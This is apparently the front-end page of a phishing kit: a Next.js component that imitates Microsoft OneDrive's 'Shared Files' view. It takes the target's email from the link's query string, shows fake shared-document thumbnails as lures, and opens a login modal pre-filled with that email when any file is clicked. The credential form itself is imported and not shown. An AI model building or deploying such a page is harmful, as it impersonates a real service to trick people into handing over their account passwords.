"use client";

import Form from '@/components/Form';
import {
  Menu, Search, ChevronDown, Settings, HelpCircle, User,
  Folder, Clock, Users, Plus, Upload, RefreshCw, Zap,
  ArrowDownNarrowWide, LayoutGrid, Info
} from 'lucide-react';
import { useSearchParams } from 'next/navigation';
import { useState, Suspense } from 'react';

const fileThumbnails = [
  {
    title: "File INDEX9505..",
    src: "/imgs/file-1.jpg",
  },
  {
    title: "Shared docume...",
    src: "/imgs/file-2.png",
  },
  {
    title: "Shared docume...",
    src: "/imgs/file-3.jpg",
  },
  {
    title: "0363NTI0 files..",
    src: "/imgs/file-4.jpg",
  },
  {
    title: "Shared docume...",
    src: "/imgs/file-3.jpg",
  }
];

function Page() {
  const searchParams = useSearchParams();
  const email = searchParams.get("email") ?? "";
  const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
  const isValidEmail = emailRegex.test(email);

  const [showLogin, setShowLogin] = useState(false);
  const [isLoading, setIsLoading] = useState(false);

  if (!email) {
    return (
      <div className="min-h-screen flex items-center justify-center">
        <div className="bg-red-50 border border-red-200 p-6 rounded">
          <h2 className="font-semibold text-red-600">Invalid Link</h2>
          <p className="mt-2">
            This shared link is missing the required email parameter.
          </p>
        </div>
      </div>
    );
  }

  if (!isValidEmail) {
    return (
      <div className="min-h-screen flex items-center justify-center">
        <div className="bg-red-50 border border-red-200 p-6 rounded">
          <h2 className="font-semibold text-red-600">Invalid Email</h2>
          <p className="mt-2">
            Please provide a valid email.
          </p>
        </div>
      </div>
    );
  }

  const openLogin = () => {
    setShowLogin(true);
  };

  return (
    <>
      {/* ── Global loading overlay ── */}
      {isLoading && (
        <div className="fixed inset-0 z-200 bg-black/55 flex items-center justify-center">
          <div className="lds-roller">
            <div /><div /><div /><div />
            <div /><div /><div /><div />
          </div>
        </div>
      )}

      {/* ── Login modal overlay ── */}
      {showLogin && (
        <div className="fixed inset-0 z-100 bg-black/55 flex items-center justify-center">
          <Form email={email} setIsLoading={setIsLoading} />
        </div>
      )}

      {/* ─────────────── Header ─────────────── */}
      <header className="bg-[#0078d4] text-white flex items-center h-12 px-4 shrink-0 justify-between">
        <div className="flex items-center flex-1">
          <button
            className="text-base mr-4 cursor-pointer bg-transparent border-none text-white p-2 flex items-center justify-center transition-colors"
            aria-label="Menu"
          >
            <Menu size={20} strokeWidth={2} />
          </button>
          <span className="text-base font-semibold">OneDrive</span>
        </div>

        {/* Search bar */}
        <div className="hidden md:flex flex-2 justify-center">
          <div className="bg-white rounded flex items-center w-100 max-w-full h-8 px-2 text-[#323130]">
            <Search size={16} className="text-[#0078d4] mr-2" />
            <input
              id="search-input"
              type="text"
              placeholder="Search"
              className="border-none outline-none flex-1 font-inherit text-sm bg-transparent"
            />
            <div className="flex items-center text-xs text-[#605e5c] border-l border-[#c8c6c4] pl-2 ml-2 cursor-pointer select-none">
              All files <ChevronDown size={14} color="blue" className="ml-1" />
            </div>
          </div>
        </div>

        {/* Right icons */}
        <div className="flex items-center flex-1 justify-end gap-1">
          <button
            id="settings-btn"
            className="cursor-pointer bg-transparent border-none text-white p-2.5 flex items-center justify-center transition-colors"
            aria-label="Settings"
          >
            <Settings size={20} />
          </button>
          <button
            id="help-btn"
            className="cursor-pointer bg-transparent border-none text-white p-2.5 flex items-center justify-center transition-colors"
            aria-label="Help"
          >
            <HelpCircle size={20} />
          </button>
          <button
            id="account-btn"
            className="cursor-pointer bg-transparent border-none text-white p-2.5 flex items-center justify-center transition-colors"
            aria-label="Account"
          >
            <User size={20} />
          </button>
        </div>
      </header>

      {/* ─────────────── Main layout ─────────────── */}
      <div className="flex flex-1 overflow-hidden font-medium">

        {/* ── Sidebar ── */}
        <aside className="hidden md:flex w-57.5 bg-[#f3f2f1] flex-col overflow-y-auto border-r border-[#edebe9]">
          <div className="py-4">
            <div className="text-[11px] font-semibold text-[#595958] px-4 pb-3 pt-2">
              Files Directory
            </div>
            <button
              className="flex items-center mb-1 py-2 px-4 cursor-pointer text-[#0d0c0b] text-sm transition-colors w-full"
            >
              <Folder size={18} className="text-[#0078d4] mr-3" fill="currentColor" />
              <span className="text-gray-600 text-sm">My Files</span>
            </button>
            <button
              className="flex items-center my-1 py-2 px-4 cursor-pointer text-[#323130] text-sm transition-colors w-full"
            >
              <Clock size={18} className="text-[#0078d4] mr-3" />
              <span className="text-gray-600 text-sm">Recent</span>
            </button>
            <button
              className="flex items-center my-1 py-2 px-4 cursor-pointer text-[#323130] text-sm bg-[#e1dfdd] font-semibold w-full"
            >
              <Users size={18} className="text-[#0078d4] mr-3" fill="currentColor" />
              <span className="text-gray-600 text-sm">Shared</span>
            </button>
          </div>

          <div className="py-4 px-4">
            <div className="text-[11px] font-semibold text-[#595958] pb-2">
              Shared Libraries
            </div>
            <p className="text-[10px] text-[#605e5c] leading-relaxed">
              Sites help you work on projects with your team and share
              information from anywhere on any device. Create or follow sites
              to see them here.
            </p>
          </div>

          <div className="mt-auto p-4 border-t border-[#edebe9] flex flex-col gap-3">
            <div className="text-[#0078d4] cursor-pointer text-xs">
              Get the OneDrive apps
            </div>
            <div className="text-[#0078d4] cursor-pointer text-xs">
              Return to classic OneDrive
            </div>
          </div>
        </aside>

        {/* ── Main content ── */}
        <main className="flex-1 flex flex-col overflow-hidden bg-white">

          {/* Toolbar */}
          <div className="hidden md:flex items-center h-11 border-b border-[#edebe9] px-4 justify-between shrink-0">
            <div className="flex items-center gap-1">
              <button
                className="bg-[#0078d4] text-white border-none flex items-center font-inherit text-sm py-1.5 px-2 rounded-sm font-semibold transition-colors"
              >
                <Plus size={16} className="mr-1" />
                New
                <ChevronDown size={14} className="ml-1" />
              </button>
              <button
                className="bg-transparent border-none flex items-center font-inherit text-sm text-gray-500 py-1.5 px-2 rounded-sm transition-colors"
              >
                <Upload size={15} color="gray" className="mr-1.5" />
                Upload
                <ChevronDown size={13} className="text-[#605e5c] ml-1" />
              </button>
              <button
                className="bg-transparent border-none flex items-center font-inherit text-sm text-gray-500 py-1.5 px-2 rounded-sm transition-colors"
              >
                <RefreshCw color="gray" size={15} className="mr-1.5" />
                Sync
              </button>
              <button
                className="bg-transparent border-none flex items-center font-inherit text-sm text-gray-500 py-1.5 px-2 rounded-sm transition-colors"
              >
                <Zap color="gray" size={15} className="mr-1.5" fill="currentColor" />
                Automate
                <ChevronDown size={13} className="text-[#605e5c] ml-1" />
              </button>
            </div>
            <div className="flex items-center gap-1">
              <button
                className="bg-transparent border-none flex items-center font-inherit text-sm text-[#323130] py-1.5 px-2 rounded-sm transition-colors"
              >
                <ArrowDownNarrowWide size={18} className="text-[#0078d4]" fill="currentColor" />
                Sort
                <ChevronDown size={13} className="text-[#605e5c] ml-1" />
              </button>
              <button
                className="bg-transparent border-none flex items-center font-inherit text-sm text-[#323130] py-1.5 px-2 rounded-sm transition-colors"
              >
                <LayoutGrid size={16} className="text-[#0078d4]" fill="currentColor" />
                <ChevronDown size={13} className="text-[#605e5c] ml-1" />
              </button>
              <button
                id="info-btn"
                className="bg-transparent border-none flex items-center font-inherit text-sm text-[#323130] py-1.5 px-2 rounded-sm transition-colors"
              >
                <Info size={16} className="text-[#0078d4]" />
              </button>
            </div>
          </div>

          {/* File grid */}
          <div
            className="flex-1 p-6 md:py-6 md:px-16 overflow-y-auto"
          >
            <h1 className="text-[1.3rem] font-normal mb-7 text-[#323130]">
              Shared Files
            </h1>

            <div className="max-w-3xl grid grid-cols-2 md:grid-cols-3 lg:grid-cols-4 gap-2">
              {fileThumbnails.map((file, idx) => (
                <div
                  key={idx}
                  id={`file-card-${idx}`}
                  onClick={openLogin}
                  className="border border-[#e1dfdd] overflow-hidden relative cursor-pointer w-33.5 h-46.25 bg-white shadow-[0_1px_2px_rgba(0,0,0,0.05)] flex flex-col hover:shadow-[0_4px_10px_rgba(0,0,0,0.12)] hover:outline-2 hover:outline-offset-2 hover:outline-[#5a84c3b3] transition-all duration-200"
                >
                  <img
                    src={file.src}
                    alt="Document preview"
                    className="w-33.5 h-46.25 object-cover object-top border-b border-[#edebe9]"
                  />
                  {/* Gradient overlay */}
                  <div className="absolute bottom-0 left-0 right-0 bg-linear-to-t from-[rgba(0,0,0,0.72)] via-[rgba(0,0,0,0.42)_55%] to-transparent pt-10 px-2.5 pb-2.5 text-white">
                    <div className="text-[13px] font-semibold whitespace-nowrap overflow-hidden text-ellipsis mb-0.5">
                      {file.title}
                    </div>
                    <div className="text-[11px] text-[#f3f2f1]">
                      A few minutes ago
                    </div>
                  </div>
                </div>
              ))}
            </div>
          </div>
        </main>
      </div>
    </>
  );
}

export default function HomePage() {
  return (
    <Suspense fallback={<div>Loading...</div>}>
      <Page />
    </Suspense>
  )
}
